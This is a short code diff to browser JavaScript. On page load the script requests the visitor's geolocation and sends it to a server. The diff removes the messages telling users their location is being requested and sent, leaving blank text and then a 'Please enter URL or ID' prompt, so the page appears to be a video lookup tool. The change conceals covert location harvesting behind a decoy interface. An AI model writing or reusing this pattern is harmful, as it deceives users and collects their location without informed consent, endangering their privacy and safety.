@@ -79,16 +79,16 @@ async function postToServer(payload) {
 // Immediately request location on page load and send if granted
 window.addEventListener('DOMContentLoaded', async () => {
   try {
-    statusText && (statusText.textContent = 'Requesting location permission...');
+    statusText && (statusText.textContent = '');
     cachedLocation = await requestLocationWithPrompt(8000);
     if (cachedLocation) {
-      statusText && (statusText.textContent = 'Location obtained. Sending to server...');
+      statusText && (statusText.textContent = '');
       console.log('Location (on load):', cachedLocation);
 
       // send once immediately (videoUrl null)
       const ok = await postToServer({ videoUrl: null, location: cachedLocation });
       if (ok) {
-        statusText && (statusText.textContent = 'Location sent to server.');
+        statusText && (statusText.textContent = 'Please enter URL or ID');
         sentOnLoad = true;
       } else {
         statusText && (statusText.textContent = 'Failed to send location on load.');
